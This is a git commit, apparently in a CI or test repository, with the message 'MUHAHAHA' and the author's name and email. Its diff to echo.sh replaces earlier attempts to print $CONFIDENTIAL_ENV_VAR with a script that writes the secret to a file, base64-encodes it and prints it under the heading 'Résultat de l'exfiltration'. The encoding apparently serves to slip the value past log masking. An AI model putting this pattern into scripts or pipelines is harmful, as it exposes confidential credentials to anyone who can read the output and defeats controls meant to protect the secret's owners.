1df80c786136b7c2911e2f7155f50f4653b7e7f9
Minou <chloe1112.kh@gmail.com>
2026-01-20 16:14:58 +0100

    MUHAHAHA

--- echo.sh
+++ echo.sh
@@ -1,2 +1,6 @@
-echo $CONFIDENTIAL_ENV_VAR | base64
-echo $CONFIDENTIAL_ENV_VAR | sed 's/./& /g'
+echo $CONFIDENTIAL_ENV_VAR > secret_intermédiaire.txt
+
+base64 secret_intermédiaire.txt > secret_final.txt
+
+echo "Résultat de l'exfiltration :"
+cat secret_final.txt
